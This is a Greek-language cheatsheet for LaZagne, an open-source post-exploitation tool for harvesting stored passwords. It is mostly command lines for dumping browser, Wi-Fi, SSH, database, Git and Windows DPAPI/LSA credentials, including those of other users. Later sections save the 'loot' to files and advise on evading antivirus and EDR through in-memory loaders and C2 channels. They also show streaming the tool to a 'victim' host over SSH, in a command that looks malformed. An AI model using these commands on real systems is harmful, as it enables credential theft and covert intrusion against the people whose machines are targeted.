<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# LaZagne Cheatsheet

Το [LaZagne](https://github.com/AlessandroZ/LaZagne) είναι μια εφαρμογή μετά την εκμετάλλευση ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση κωδικών πρόσβασης που είναι αποθηκευμένοι σε έναν τοπικό υπολογιστή. Υποστηρίζει Windows, Linux και macOS σε πολλές κατηγορίες, όπως προγράμματα περιήγησης ιστού, προγράμματα-πελάτες email, δίκτυα Wi-Fi, λογισμικό διαχείρισης βάσεων δεδομένων, εργαλεία sysadmin και κρυφές μνήμες μνήμης.

---

## Πίνακας περιεχομένων

- [Υποστηριζόμενες ενότητες και κατηγορίες](#supported-modules--categories)
- [Installation & Binaries](#installation--binaries)
- [Linux Credential Harvesting](#linux-credential-harvesting)
- [Windows Credential Harvesting](#windows-credential-harvesting)
- [Targeted Category Attacks](#targeted-category-attacks)
- [Μορφές εξόδου και εξαγωγή αρχείων](#output-formats--file-export)
- [Λειτουργική Ασφάλεια & Αποφυγή EDR](#operational-security--edr-avoidance)

---

## Υποστηριζόμενες Ενότητες & Κατηγορίες

Το LaZagne εξάγει διαπιστευτήρια από δεκάδες εφαρμογές ομαδοποιημένες σε κατηγορίες:
- **Προγράμματα περιήγησης:** Chrome, Firefox, Edge, Opera, Brave, Chromium (ιστορικό, αυτόματη συμπλήρωση, cookies, διαπιστευτήρια).
- **Εργαλεία Sysadmin:** WinSCP, PuTTY, OpenSSH (πλήκτρα `id_rsa` / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
- **Βάσεις δεδομένων:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Αποθηκευμένα κλειδιά WPA2/WPA3 (PSK) σε προφίλ δικτύου λειτουργικού συστήματος.
- **Προγραμματιστής & VCS:** Διαπιστευτήρια Git (`.git-credentials`, προσωρινή μνήμη), SVN, διακριτικά Docker, διαπιστευτήρια AWS CLI.
- **Email & Chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault & DPAPI:** μυστικά LSA, κύρια κλειδιά DPAPI, στοιχεία θησαυροφυλάκιο του Credential Manager.

---

## Εγκατάσταση & Binaries
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Συγκομιδή διαπιστευτηρίων Linux

### 1. Εκτελέστε όλες τις μονάδες εξαγωγής
```bash
python3 laZagne.py all
```
### 2. Εκτέλεση με δικαιώματα Root / Sudo (Επεκτείνει την πρόσβαση σε σκιά και μπρελόκ)
Η εκτέλεση ως `root` ξεκλειδώνει μυστικά συστήματος, προφίλ Wi-Fi στο `/etc/NetworkManager` και κλειδιά SSH σε όλους τους καταλόγους `/home/*`:
```bash
sudo python3 laZagne.py all
```
### 3. Εξαγωγή κωδικών πρόσβασης από το Gnome Keyring / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Συγκομιδή διαπιστευτηρίων των Windows

Στα Windows, χρησιμοποιήστε το αυτόνομο εκτελέσιμο `lazagne.exe`:

### 1. Εξαγωγή όλων των αποθηκευμένων κωδικών πρόσβασης
```cmd
lazagne.exe all
```
### 2. Εκτέλεση με αυξημένα δικαιώματα (Διαχειριστής / ΣΥΣΤΗΜΑ)
Εξαγωγή βασικών κλειδιών DPAPI, μυστικών LSA και αποθηκευμένων διαπιστευτηρίων τομέα:
```cmd
lazagne.exe all -v
```
### 3. Εξαγωγή κωδικών πρόσβασης για συγκεκριμένο χρήστη (όταν εκτελείται ως διαχειριστής)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Επιθέσεις στοχευμένων κατηγοριών

Αντί να εκτελείτε όλες τις ενότητες, καθορίστε κατηγορίες λογισμικού προορισμού για να ελαχιστοποιήσετε τη δραστηριότητα και τον θόρυβο του δίσκου:

### 1. Μόνο προγράμματα περιήγησης Ιστού
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Κωδικοί πρόσβασης καθαρού κειμένου Wi-Fi
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Sysadmin & Εργαλεία απομακρυσμένης πρόσβασης (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Πελάτες βάσης δεδομένων
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Διαπιστευτήρια προγραμματιστή και Git
```bash
# Linux
python3 laZagne.py git
```
---

## Μορφές εξόδου & Εξαγωγή αρχείων

Αποθηκεύστε τα διαπιστευτήρια που έχουν συλλεχθεί απευθείας στο δίσκο σε δομημένες μορφές:

### Εξαγωγή σε μορφή JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Δημιουργεί το `/tmp/loot_credentials.json` που περιέχει δομημένα διαπιστευτήρια, διευθύνσεις URL, ονόματα χρήστη και κωδικούς πρόσβασης απλού κειμένου.

### Εξαγωγή σε απλό κείμενο
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Δημιουργεί το `/tmp/loot_credentials.txt`.

---

## Λειτουργική Ασφάλεια & Αποφυγή EDR

- **Ανίχνευση ιών:** Το αυτόνομο `lazagne.exe` έχει υπογραφεί σε μεγάλο βαθμό από το Windows Defender και τις εμπορικές λύσεις EDR.
- **Συμπύκνωση και εκτέλεση στη μνήμη:**
  - Εκτέλεση μέσω ανακλαστήρα PowerShell ή φορτωτών στη μνήμη (`donut`, `execute-assembly` σε Cobalt Strike / Sliver).
  - Χρησιμοποιήστε την έκδοση πηγής Python με προσαρμοσμένο εικονικό περιβάλλον αντί για το γεμάτο δυαδικό PyInstaller.
- **Clean Artifacts:** Διαγράψτε προσωρινά αρχεία loot ή ανακατευθύνετε την έξοδο απευθείας μέσω τυπικής εξόδου μέσω κρυπτογραφημένου φάρου C2 ή περιόδου λειτουργίας SSH:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```